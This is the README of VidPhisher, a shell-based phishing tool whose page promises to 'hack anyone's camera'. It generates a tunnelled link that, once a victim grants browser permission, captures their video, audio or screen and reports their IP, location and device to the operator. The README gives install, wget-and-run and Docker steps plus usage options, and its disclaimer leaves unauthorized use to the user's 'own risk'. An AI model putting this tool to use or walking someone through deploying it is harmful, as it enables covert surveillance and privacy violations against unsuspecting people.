<h2 align="center"><u>VidPhisher</u></h2>

![Hack anyone's camera and get videos](https://github.com/KasRoudra/VidPhisher/raw/main/files/banner.png)

<h4 align="center"> Hack anyone's camera and get videos!</h4>

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.2-blue?style=for-the-badge&color=blue">
   <img src="https://img.shields.io/github/stars/KasRoudra/VidPhisher?style=for-the-badge&color=magenta">
  <img src="https://img.shields.io/github/forks/KasRoudra/VidPhisher?color=cyan&style=for-the-badge&color=purple">
  <img src="https://img.shields.io/github/issues/KasRoudra/VidPhisher?color=red&style=for-the-badge">
  <img src="https://img.shields.io/github/license/KasRoudra/VidPhisher?style=for-the-badge&color=blue">
<br>
    <img src="https://img.shields.io/badge/Author-KasRoudra-green?style=flat-square">
    <img src="https://img.shields.io/badge/Open%20Source-Yes-orange?style=flat-square">
    <img src="https://img.shields.io/badge/Maintained-Yes-cyan?style=flat-square">
    <img src="https://img.shields.io/badge/Written%20In-Shell-blue?style=flat-square">
</p>

### [+] Description

**VidPhisher is a phishing tool. It will generate a link. If anyone opens the link and permits camera access, his/her video will be captured and sent to you!**

### [*]Announcent

This project is now a part of [MaxPhisher](https://github.com/KasRoudra/MaxPhisher). Further bug fixes and feature addition will be available in that


### [+] Installation

- `git clone https://github.com/KasRoudra/VidPhisher`
- `cd VidPhisher`

For termux, use additional command `termux-setup-storage`

- `bash vp.sh`

##### Or Run Directly

```
wget https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/vp.sh && bash vp.sh
```

### Docker

 - `sudo docker pull kasroudra/vidphisher`
 - `sudo docker run --rm -it --name vidphisher kasroudra/vidphisher`
 - `sudo docker cp vidphisher:/VidPhisher vidfiles` [Run this on another terminal to copy received video/audio from docker to vidfiles folder keeping container open] 


##### Usage

```
Usage: bash vp.sh [-h] [-o OPTION] [-p PORT] [-t TYPE] [-s DURATION] [-d DIRECTORY] [-u] [-nu]

Options:
  -h, --help                           Show this help message and exit
  -o OPTION, --option OPTION           Index of the template
  -p PORT, --port PORT                 Port of VidPhisher's Server (Default: 8080)
  -t TYPE, --type TYPE                 Type of media (video or audio or screen, Default: video)
  -T TUNNELER, --tunneler TUNNELER     Name of the tunneler for url shortening (Default: cloudflared)
  -d DIRECTORY, --directory DIRECTORY  Directory where images will be saved
  -s DURATION, --duration DURATION     Duration of media (Default: 5000(ms))
  --update(-u), --no-update (-nu)      Check for update (Default: true)
```

### [+] Features

- Two Templates
- Get IP, Location, Device type and Browser
- Concurrent triple tunneling (Ngrok, Cloudflared and Loclx)
- Choose where to save videos(custom directory)
- Error Diagnoser
- Argument support for templates, type, port, duration and directory

### [+] Preview

![Hack anyone's camera and get videos](https://github.com/KasRoudra/VidPhisher/raw/main/files/vp.gif)

### [+] Depenencies

- `php`
- `curl`
- `wget`
- `unzip`

All of the necessary depenencies will be installed automatically in first run!

### [+] Note

Edge do not suport video capturing. Only audio can be captured from it. Only Firefox supports screen capturing additionally. And most of the rests support video and audio. If browser doesn't block VidPhisher and the victim allows access only then you can capture video/audio

### [+] Credits

Thanks to <a href="https://github.com/Techchipnet/camphish">Techchip</a> and <a href="https://github.com/muaz-khan/RecordRTC">Muaz Khan</a> for their open source codes!

### [+] Disclaimer

**_This tool is developed for educational purposes. Here it demonstrates how camera phishing works. If anybody wants to gain unauthorized access to someones camera, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of VidPhisher!_**

## [~] Find Me on :

- [![Github](https://img.shields.io/badge/Github-KasRoudra-green?style=for-the-badge&logo=github)](https://github.com/KasRoudra)

- [![Gmail](https://img.shields.io/badge/Gmail-KasRoudra-green?style=for-the-badge&logo=gmail)](mailto:kasroudrakrd@gmail.com)

- [![Facebook](https://img.shields.io/badge/Facebook-KasRoudra-green?style=for-the-badge&logo=facebook)](https://facebook.com/KasRoudra)

- [![Messenger](https://img.shields.io/badge/Messenger-KasRoudra-green?style=for-the-badge&logo=messenger)](https://m.me/KasRoudra)

